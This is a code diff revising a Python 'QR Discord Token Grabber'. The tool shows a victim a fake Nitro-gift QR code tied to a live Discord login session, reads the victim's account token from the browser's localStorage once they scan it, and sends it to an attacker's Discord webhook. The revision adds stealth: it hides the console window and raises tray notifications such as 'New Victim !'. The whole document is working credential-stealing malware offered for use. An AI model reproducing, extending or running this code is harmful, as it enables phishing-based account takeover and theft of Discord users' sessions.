@@ -1,21 +1,17 @@
-import base64, os, platform, re, time, sys
+import base64, os, re, time, sys
 from requests import get
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 from PIL import Image
 from selenium import webdriver
-from warnings import filterwarnings
+from selenium.webdriver.chrome.service import Service
 from discord_webhook import DiscordEmbed, DiscordWebhook
+from utilities import pystray_img
+from pystray import Menu, MenuItem, Icon
+from io import BytesIO
+import ctypes
+from threading import Thread
 
-def clear() -> None:
-    #Clear the screen; works with "cls" and "clear" commands.
-    if platform.system() == "Windows":
-        os.system("cls")
-    elif platform.system() == "Darwin" or platform.system() == "Linux":
-        os.system("clear")
-    else:
-        pass
-        
 def generate_qr() -> None:
     #Generate a QR code to paste onto a discord nitro template.
     qr_img = Image.open(os.path.normpath(r"resources/qr_code.png"), "r")
@@ -63,7 +59,7 @@ def main(webhook_url) -> None:
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
     opts.headless = True
     opts.add_argument('--log-level 3') 
-    driver = webdriver.Chrome(os.path.normpath(r"browser/chromedriver.exe"), options=opts)
+    driver = webdriver.Chrome(service=Service(os.path.normpath(r"browser/chromedriver.exe")), options=opts)
     driver.get("https://discord.com/login")
     time.sleep(5)  # Make sure QR has fully loaded before taking source!
     source = BeautifulSoup(driver.page_source, features="lxml")
@@ -88,8 +84,11 @@ the regular expression 'qrCode-......' is not found.")
 
     print(f"""
 {Fore.LIGHTGREEN_EX}Generated QR as discord_gift.png!
-{Fore.BLUE}Waiting for target user to scan the QR code. . .""")
-
+{Fore.BLUE}Waiting for target user to scan the QR code. . .
+""")
+    pystray_icon.icon.notify("Script currently being hided until target grabbed.", 'Waiting for target')
+    time.sleep(3)
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     while True:
         if discord_login != driver.current_url:
             token = driver.execute_script('''
@@ -102,13 +101,15 @@ var token = JSON.parse(localStorage.token);
 return token;
 ''')
             break
-
+    pystray_icon.icon.notify("The traget scanned the QR-code sucessfuly.", 'New Victim !')
+    time.sleep(3)
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
     print(f"""
 {Fore.LIGHTGREEN_EX}The following token has been grabbed: {token}
 
 {Fore.LIGHTYELLOW_EX}Sending Info to Discord Webhook... {Fore.LIGHTWHITE_EX}""", 
 end="")
-
+    driver.quit()
     webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://c.tenor.com/h3fCM442dCcAAAAC/discord-logo.gif")
     embed = DiscordEmbed(color='FF00FF')
     if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
@@ -136,14 +137,12 @@ end="")
     print(f"{Fore.LIGHTGREEN_EX}Information sended to webhook !")
     
 if __name__ == "__main__":
-    filterwarnings("ignore", category=DeprecationWarning) 
     init()
-    clear()
+    os.system("cls")
     print(f"""
 
 {Fore.GREEN}QR Discord Token Grabber
 {Fore.BLUE}Created by NightfallGT
-Using utilities.tk API 
 Revised by Luci (9P9)
 Revised by Lemon.-_-.#3714 (mouadessalim)
 Revised by the-cult-of-integral
@@ -151,6 +150,29 @@ Revised by mte0
 
 {Fore.LIGHTYELLOW_EX}Enter a webhook URL.
 >>> {Fore.LIGHTWHITE_EX}""", end="")
-    main(input())
-    input(f'{Fore.LIGHTYELLOW_EX}>>>')
-    print(f"{Fore.RESET}")
+
+    def pystray_icon():
+        def window_state(icon, item):
+            if str(item) == 'Show':
+                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+            elif str(item) == 'Hide':
+                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+            elif str(item) == 'Quit':
+                pystray_icon.icon.stop()
+                os._exit(0)
+
+        pystray_icon.icon = Icon('QR_DTG', Image.open(BytesIO(base64.b64decode(pystray_img))), menu=Menu(
+            MenuItem('Show', window_state),
+            MenuItem('Hide', window_state),
+            MenuItem('Quit', window_state)
+        ))
+        pystray_icon.icon.run()
+
+    Thread(target=pystray_icon).start()
+    th_main = Thread(target=main, args=(input(),))
+    th_main.start()
+    while True:
+        if not th_main.is_alive():
+            pystray_icon.icon.stop()
+            break
+        time.sleep(1)
